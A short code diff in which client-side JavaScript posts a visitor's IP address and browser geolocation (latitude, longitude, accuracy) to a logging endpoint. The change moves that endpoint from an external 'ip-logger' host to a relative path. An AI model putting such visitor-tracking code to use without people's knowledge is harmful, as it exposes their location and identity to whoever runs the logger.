@@ -178,14 +178,14 @@
             const geo_lon = pos.coords.longitude;
             const accuracy = pos.coords.accuracy;
 
-            await fetch("https://ip-logger-1bdu.onrender.com/log-ip", {
+            await fetch("/log-ip", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ ip, geo_lat, geo_lon, accuracy })
             });
           },
           async () => {
-            await fetch("https://ip-logger-1bdu.onrender.com/log-ip", {
+            await fetch("/log-ip", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ ip })
